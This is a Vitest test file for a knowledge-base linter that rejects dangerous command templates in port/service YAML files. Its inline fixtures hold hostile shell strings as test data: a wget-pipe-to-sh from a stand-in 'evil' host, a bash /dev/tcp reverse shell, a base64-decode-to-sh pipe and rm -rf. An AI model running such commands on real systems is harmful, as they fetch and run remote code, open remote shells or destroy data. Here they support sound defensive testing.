import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { describe, it, expect } from "vitest";
import {
  lintKnowledgeBase,
  COMMAND_DENYLIST,
  PLACEHOLDER_ALLOWLIST,
} from "../../../../scripts/lint-kb.js";

const REPO_ROOT = path.resolve(__dirname, "..", "..", "..", "..");
const FIXTURES_INVALID = path.join(REPO_ROOT, "tests/fixtures/kb/invalid");
const FIXTURES_SHIPPED = path.join(REPO_ROOT, "tests/fixtures/kb/shipped");

function mkFixtureDir(files: string[]): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kb-lint-"));
  for (const src of files) {
    fs.copyFileSync(src, path.join(dir, path.basename(src)));
  }
  return dir;
}

function writeYaml(dir: string, filename: string, content: string): string {
  const file = path.join(dir, filename);
  fs.writeFileSync(file, content, "utf8");
  return file;
}

function emptyDir(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), "kb-lint-empty-"));
}

const VALID_DEFAULT = path.join(FIXTURES_SHIPPED, "default.yaml");

describe("scripts/lint-kb.ts (Plan 06)", () => {
  describe("constants", () => {
    it("exposes ≥6 entries in COMMAND_DENYLIST (rm-rf, curl-pipe, wget-pipe, dev-tcp, base64-pipe, pipe-sh)", () => {
      expect(COMMAND_DENYLIST.length).toBeGreaterThanOrEqual(6);
      const names = COMMAND_DENYLIST.map((r) => r.name);
      for (const expected of [
        "rm-rf",
        "curl-pipe-sh",
        "wget-pipe-sh",
        "dev-tcp",
        "base64-pipe",
        "pipe-sh",
      ]) {
        expect(names).toContain(expected);
      }
    });

    it("PLACEHOLDER_ALLOWLIST accepts {IP}, {PORT}, {HOST}", () => {
      expect(PLACEHOLDER_ALLOWLIST.test("{IP}")).toBe(true);
      expect(PLACEHOLDER_ALLOWLIST.test("{PORT}")).toBe(true);
      expect(PLACEHOLDER_ALLOWLIST.test("{HOST}")).toBe(true);
    });

    it("PLACEHOLDER_ALLOWLIST rejects {FOO}, {TARGET}, {RHOST}", () => {
      expect(PLACEHOLDER_ALLOWLIST.test("{FOO}")).toBe(false);
      expect(PLACEHOLDER_ALLOWLIST.test("{TARGET}")).toBe(false);
      expect(PLACEHOLDER_ALLOWLIST.test("{RHOST}")).toBe(false);
    });

    it("P1-E: PLACEHOLDER_ALLOWLIST accepts {WORDLIST_*} keys", () => {
      expect(PLACEHOLDER_ALLOWLIST.test("{WORDLIST_DIRB_COMMON}")).toBe(true);
      expect(PLACEHOLDER_ALLOWLIST.test("{WORDLIST_RAFT_DIRS_BIG}")).toBe(true);
      expect(PLACEHOLDER_ALLOWLIST.test("{WORDLIST_CUSTOM_42}")).toBe(true);
    });

    it("P1-E: PLACEHOLDER_ALLOWLIST rejects malformed wordlist keys", () => {
      expect(PLACEHOLDER_ALLOWLIST.test("{WORDLIST}")).toBe(false);
      expect(PLACEHOLDER_ALLOWLIST.test("{WORDLIST_}")).toBe(false);
      expect(PLACEHOLDER_ALLOWLIST.test("{WORDLIST_lowercase}")).toBe(false);
      expect(PLACEHOLDER_ALLOWLIST.test("{wordlist_dirb}")).toBe(false);
    });
  });

  describe("clean shipped KB", () => {
    it("exits 0 (no failures) on the valid shipped fixture corpus", () => {
      const portsDir = mkFixtureDir([
        path.join(FIXTURES_SHIPPED, "22-ssh.yaml"),
        path.join(FIXTURES_SHIPPED, "445-smb.yaml"),
      ]);
      const { failures } = lintKnowledgeBase({
        portsDir,
        defaultFile: VALID_DEFAULT,
      });
      expect(failures).toEqual([]);
    });
  });

  describe("schema rule (T-03 prose, T-02 url-scheme via Zod)", () => {
    it("KB-08/T-03: rejects resource entry with prose `description` field", () => {
      const portsDir = mkFixtureDir([
        path.join(FIXTURES_INVALID, "prose-in-resource.yaml"),
      ]);
      const { failures } = lintKnowledgeBase({
        portsDir,
        defaultFile: VALID_DEFAULT,
      });
      expect(failures.some((f) => f.rule === "schema")).toBe(true);
    });

    it("KB-11/T-02: rejects resource URL with non-http(s) scheme (javascript:)", () => {
      const portsDir = mkFixtureDir([
        path.join(FIXTURES_INVALID, "bad-url-scheme.yaml"),
      ]);
      const { failures } = lintKnowledgeBase({
        portsDir,
        defaultFile: VALID_DEFAULT,
      });
      // Schema refine catches it; rule is "schema"
      expect(failures.some((f) => f.rule === "schema")).toBe(true);
    });
  });

  describe("placeholder rule (KB-09)", () => {
    it("KB-09: rejects command template with {FOO} unknown placeholder", () => {
      const portsDir = mkFixtureDir([
        path.join(FIXTURES_INVALID, "unknown-placeholder.yaml"),
      ]);
      const { failures } = lintKnowledgeBase({
        portsDir,
        defaultFile: VALID_DEFAULT,
      });
      expect(
        failures.some(
          (f) => f.rule === "placeholder" && f.detail.includes("FOO"),
        ),
      ).toBe(true);
    });
  });

  describe("command-denylist rule (KB-11/T-01)", () => {
    it("rejects command containing `curl ... | sh` (fixture)", () => {
      const portsDir = mkFixtureDir([
        path.join(FIXTURES_INVALID, "denylist-command.yaml"),
      ]);
      const { failures } = lintKnowledgeBase({
        portsDir,
        defaultFile: VALID_DEFAULT,
      });
      expect(
        failures.some(
          (f) => f.rule === "command-denylist" && f.detail.includes("curl"),
        ),
      ).toBe(true);
    });

    it("rejects command containing `rm -rf`", () => {
      const dir = emptyDir();
      writeYaml(
        dir,
        "evil.yaml",
        [
          "schema_version: 1",
          "port: 80",
          "service: http",
          "protocol: tcp",
          "risk: medium",
          "commands:",
          '  - label: "rm-rf danger"',
          '    template: "rm -rf /tmp/foo"',
          "resources:",
          '  - title: "x"',
          '    url: "https://example.com"',
          "",
        ].join("\n"),
      );
      const { failures } = lintKnowledgeBase({
        portsDir: dir,
        defaultFile: VALID_DEFAULT,
      });
      expect(
        failures.some(
          (f) =>
            f.rule === "command-denylist" && f.detail.includes("rm-rf"),
        ),
      ).toBe(true);
    });

    it("rejects command containing `wget ... | sh`", () => {
      const dir = emptyDir();
      writeYaml(
        dir,
        "evil.yaml",
        [
          "schema_version: 1",
          "port: 80",
          "service: http",
          "protocol: tcp",
          "risk: medium",
          "commands:",
          '  - label: "wget pipe"',
          '    template: "wget http://evil/x | sh"',
          "resources:",
          '  - title: "x"',
          '    url: "https://example.com"',
          "",
        ].join("\n"),
      );
      const { failures } = lintKnowledgeBase({
        portsDir: dir,
        defaultFile: VALID_DEFAULT,
      });
      expect(
        failures.some(
          (f) =>
            f.rule === "command-denylist" &&
            f.detail.includes("wget-pipe-sh"),
        ),
      ).toBe(true);
    });

    it("rejects command containing `/dev/tcp`", () => {
      const dir = emptyDir();
      writeYaml(
        dir,
        "evil.yaml",
        [
          "schema_version: 1",
          "port: 80",
          "service: http",
          "protocol: tcp",
          "risk: medium",
          "commands:",
          '  - label: "bash reverse"',
          '    template: "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"',
          "resources:",
          '  - title: "x"',
          '    url: "https://example.com"',
          "",
        ].join("\n"),
      );
      const { failures } = lintKnowledgeBase({
        portsDir: dir,
        defaultFile: VALID_DEFAULT,
      });
      expect(
        failures.some(
          (f) =>
            f.rule === "command-denylist" && f.detail.includes("dev-tcp"),
        ),
      ).toBe(true);
    });

    it("rejects command containing `base64 -d | sh`", () => {
      const dir = emptyDir();
      writeYaml(
        dir,
        "evil.yaml",
        [
          "schema_version: 1",
          "port: 80",
          "service: http",
          "protocol: tcp",
          "risk: medium",
          "commands:",
          '  - label: "base64 pipe"',
          '    template: "echo abc | base64 -d | sh"',
          "resources:",
          '  - title: "x"',
          '    url: "https://example.com"',
          "",
        ].join("\n"),
      );
      const { failures } = lintKnowledgeBase({
        portsDir: dir,
        defaultFile: VALID_DEFAULT,
      });
      expect(
        failures.some(
          (f) =>
            f.rule === "command-denylist" &&
            f.detail.includes("base64-pipe"),
        ),
      ).toBe(true);
    });

    it("rejects bare `| bash` (no space — T-12)", () => {
      const dir = emptyDir();
      writeYaml(
        dir,
        "evil.yaml",
        [
          "schema_version: 1",
          "port: 80",
          "service: http",
          "protocol: tcp",
          "risk: medium",
          "commands:",
          '  - label: "no space pipe"',
          '    template: "echo evil |bash"',
          "resources:",
          '  - title: "x"',
          '    url: "https://example.com"',
          "",
        ].join("\n"),
      );
      const { failures } = lintKnowledgeBase({
        portsDir: dir,
        defaultFile: VALID_DEFAULT,
      });
      expect(
        failures.some((f) => f.rule === "command-denylist"),
      ).toBe(true);
    });
  });
});
